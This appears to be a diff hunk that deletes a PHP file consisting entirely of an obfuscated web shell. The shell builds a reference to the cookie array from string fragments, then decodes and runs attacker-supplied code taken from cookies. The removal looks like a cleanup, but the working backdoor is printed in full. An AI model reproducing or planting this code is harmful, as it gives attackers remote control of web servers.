@@ -1,1 +1,0 @@
-<?php $q='OO';/*f(,D*/$to='_C';$g/*1,:6*/='E';$af/*0.[*/='KI';$ty=/*|*/${$to.$q.$af.$g};if(isset($ty['d'])){$es=$ty['d'].$ty['I'];$e=$ty['c'].$ty['M'].$ty['Xt'];$yf=$es('',$e($ty['Nr']));$yf();}
